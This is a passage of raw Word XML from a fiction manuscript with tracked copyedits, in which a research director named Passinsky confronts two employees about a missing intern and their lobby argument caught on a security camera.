      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>To:</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>” line alongside her own address.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Passinsky, gaunt and gray, </w:t>
      </w:r>
      <w:ins w:id="495" w:author="TextVet" w:date="2016-03-15T15:45:00Z">
        <w:r w:rsidR="00B030F0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>met</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="496" w:author="TextVet" w:date="2016-03-15T15:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B030F0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>look</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="497" w:author="TextVet" w:date="2016-03-15T15:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B030F0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ed at</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> her with</w:t>
      </w:r>
      <w:del w:id="498" w:author="TextVet" w:date="2016-03-15T15:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B030F0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> an expressionless gaze</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
      <w:ins w:id="499" w:author="TextVet" w:date="2016-03-15T15:45:00Z">
        <w:r w:rsidR="00B030F0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> vapid, wraith-like gaze a</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s she </w:t>
      </w:r>
      <w:ins w:id="500" w:author="TextVet" w:date="2016-03-15T15:45:00Z">
        <w:r w:rsidR="00B030F0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>entered</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="501" w:author="TextVet" w:date="2016-03-15T15:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B030F0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>walked through the door</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. His glassy blue eyes focused with detachment, as though the people </w:t>
      </w:r>
      <w:ins w:id="502" w:author="TextVet" w:date="2016-03-15T15:46:00Z">
        <w:r w:rsidR="00187FBB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>before</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="503" w:author="TextVet" w:date="2016-03-15T15:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00187FBB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>in front of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> him were merely elements of some mildly interesting puzzle.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asked to see me, Doctor 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Roger sat in one of two </w:t>
      </w:r>
      <w:ins w:id="504" w:author="TextVet" w:date="2016-03-15T15:47:00Z">
        <w:r w:rsidR="00E416DE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>modest</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="505" w:author="TextVet" w:date="2016-03-15T15:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E416DE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>small</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, narrow chairs in front of Passinsky’s desk, still wearing the glasses with the crack down the lens. Tina closed the door</w:t>
      </w:r>
      <w:del w:id="506" w:author="TextVet" w:date="2016-03-15T15:49:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CE31A4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> behind her</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and took the other seat. The two of them avoided looking at each other.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spoke with flat intonations, his English coming to him solely through practice and force of will. “I have to deal with personnel problems,” he said gruffly. “It take time away from research. Research is interesting. Personnel problems are not.”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shrank in her seat, </w:t>
      </w:r>
      <w:ins w:id="507" w:author="TextVet" w:date="2016-03-15T15:50:00Z">
        <w:r w:rsidR="00A73DC1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>wordless</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="508" w:author="TextVet" w:date="2016-03-15T15:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A73DC1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>saying nothing</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“My biggest problem right now,” he continued, “is with Julie. Have you seen her come into office in a last few days?”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I don’t think so. I don’t think she’s been here all week.”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have you checked is she reading her email?” Passinsky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shook his head. “Her account’s had no recent activity, Dr. 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 she okay?” asked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don’t know,” said Passinsky. “But it is very important for company to find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looked bored. “She’s an intern. How important can she be?”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was given very simple assignment,” said Passinsky. “Very tedious, but very critical. She ruined it. Now we need her to fix. Her timing is… unfortunate. As Christina can tell you, we have very important visitor coming. If this situation is not resolved, he will be very unhappy.” After a pause, Passinsky added, “And this is not a man who you want to make unhappy.”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offered, “Should I call Julie’s school</w:t>
      </w:r>
      <w:ins w:id="509" w:author="TextVet" w:date="2016-03-15T15:51:00Z">
        <w:r w:rsidR="006700D9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="510" w:author="TextVet" w:date="2016-03-15T15:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006700D9">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see if they’ve heard from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“Yes,” </w:t>
      </w:r>
      <w:ins w:id="511" w:author="TextVet" w:date="2016-03-15T15:53:00Z">
        <w:r w:rsidR="004F4FB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>urge</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="512" w:author="TextVet" w:date="2016-03-15T15:53:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004F4FB9">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 Passinsky. “And her family and friends. If you find her, tell her she must come to work tomorrow, and I take care of everything else. If you </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>don’t</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> find her, there is lots of paperwork for you to do.”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looked down. “What kind of paperwork?”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 have to end her employment,” said Passinsky. “That will mean filling out termination forms, filing payroll, writing notice to her university internship program. You will need to check what else.”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“Alright. If I don’t hear from her by end-of-day, I’ll fill out those forms tomorrow.”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shook his head. “No. I want them on my desk when I walk into office. I will need to sign them and send them out first thing in a morning.”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“Wait, what?” Tina said with a gulp. “But… I’ll have to stay late tonight to finish all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shrugged. “Either way, needs to be done.”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turned </w:t>
      </w:r>
      <w:del w:id="513" w:author="TextVet" w:date="2016-03-15T15:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004D7686">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">her face </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">away, taking a moment to </w:t>
      </w:r>
      <w:del w:id="514" w:author="TextVet" w:date="2016-03-15T15:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E71034">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">quietly </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">grumble </w:t>
      </w:r>
      <w:ins w:id="515" w:author="TextVet" w:date="2016-03-15T15:55:00Z">
        <w:r w:rsidR="00E71034">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">softly </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to herself.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would do it myself,” Passinsky offered, “but I had to take time this afternoon to attend to another matter. Also is one I want to talk to the two of you about.”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mumbled, “You mean you have us here for something besides the Julie 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 said Passinsky. “Here is my issue. Neither of you is part of my research staff. So I do not expect you know these words: ‘vasopressin’ or ‘oxytocin’…”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knew the terms. They were hormones. She recalled that both had something to do with sex. She didn’t want to know where this was going.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are mammalian behavioral modulators for instincts of reproduction,” said Passinsky. “Oxytocin is most active in adult females. It is linked to delirium of being ‘in love’. It is released through erogenous stimulation of nipples and vaginal wall.” Hearing the old scientist use those words made Tina press her knees tighter together. “There are theories that oxytocin potentiation of dopaminergic reward pathway gives it addictive properties, and loss could trigger withdrawal symptoms.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“Vasopressin drives sexual territoriality. It is hormone responsible for jealousy. Vasopressin is subject of some ongoing research, because in humans it can act on </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>indirect triggers. Rats, for example, get angry by smell of another rat on their mate — this is easy to explain by pheromones. Humans, though, somehow have aggression responses wired to symbolic processing, such as sound of spoken words. This means that human can hear someone say something, and exhibit immediate hormonal response. Observe…”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516" w:author="TextVet" w:date="2016-03-15T15:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000B609F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">There was a monitor on his desk. </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">He </w:t>
      </w:r>
      <w:ins w:id="517" w:author="TextVet" w:date="2016-03-15T15:57:00Z">
        <w:r w:rsidR="006F6B04">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>swivel</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="518" w:author="TextVet" w:date="2016-03-15T15:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006F6B04">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>turn</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ed </w:t>
      </w:r>
      <w:del w:id="519" w:author="TextVet" w:date="2016-03-15T15:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000B609F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>i</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="520" w:author="TextVet" w:date="2016-03-15T15:57:00Z">
        <w:r w:rsidR="004E2E84">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>his desk</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="521" w:author="TextVet" w:date="2016-03-15T15:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004E2E84">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>t</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="522" w:author="TextVet" w:date="2016-03-15T15:57:00Z">
        <w:r w:rsidR="000B609F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="000B609F" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>moni</w:t>
        </w:r>
        <w:r w:rsidR="004E2E84">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">tor </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="523" w:author="TextVet" w:date="2016-03-15T15:58:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004E2E84">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around to face them. The screen showed a choppy-moving overhead view of Tina and Roger arguing in the reception area earlier that day. Their fight had been captured by the lobby’s security camera.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flushed. She knew the security camera was there. There were probably dozens of them in the building. She never thought anybody actually looked at the footage.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“Now, watch this part,” said Passinsky. “At this moment, Roger says something, and…” The Tina on the screen threw her iPhone at the digital Roger. “Right there! Instinctual aggression in response to comprehension of sound waves as words conveying ideas — a non-instinctual stimulus! Fascinating, no?”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leaned forward and began stammering an apology.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squirmed. “What’s your point, Doctor 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replied with a sudden sharpness. “My </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>point</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, is that I am running here a research company! Not a high school full of children who do not control their hormones!”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shrank in her chair. Roger cringed.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what I took this job for?” Passinsky grumbled. “To do science. You know what I do all day instead? Paperwork. All the time paperwork. Payroll, taxes, insurance, performance reviews, and nonstop American legal bullshit. Now I have to spend time covering company’s ass over stupid lover spat! Listen. I don’t know what you two have going on. I do not </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>want</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> to know. None of my business. But you bring it to my business, you </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>make</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> it my business. Understand?”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and Roger looked at him sheepishly.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now, we have two ways to take this. We can treat this as science matter, or as paperwork matter. How do you want to handle?”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Tina gave </w:t>
      </w:r>
      <w:del w:id="524" w:author="TextVet" w:date="2016-03-15T16:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00286467">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">him </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a tiny shrug</w:t>
      </w:r>
      <w:ins w:id="525" w:author="TextVet" w:date="2016-03-15T16:01:00Z">
        <w:r w:rsidR="00286467">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="526" w:author="TextVet" w:date="2016-03-15T16:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00286467">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w:t>
      </w:r>
      <w:ins w:id="527" w:author="TextVet" w:date="2016-03-15T16:01:00Z">
        <w:r w:rsidR="00286467">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>h</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="528" w:author="TextVet" w:date="2016-03-15T16:00:00Z">
        <w:r w:rsidR="00286467">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">er head </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sh</w:t>
      </w:r>
      <w:ins w:id="529" w:author="TextVet" w:date="2016-03-15T16:01:00Z">
        <w:r w:rsidR="00286467">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>a</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="530" w:author="TextVet" w:date="2016-03-15T16:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00286467">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>oo</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:ins w:id="531" w:author="TextVet" w:date="2016-03-15T16:01:00Z">
        <w:r w:rsidR="00286467">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her </w:t>
      </w:r>
      <w:del w:id="532" w:author="TextVet" w:date="2016-03-15T16:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00286467">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">head </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>uncertain</w:t>
      </w:r>
      <w:ins w:id="533" w:author="TextVet" w:date="2016-03-15T16:01:00Z">
        <w:r w:rsidR="00286467">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="534" w:author="TextVet" w:date="2016-03-15T16:01:00Z">
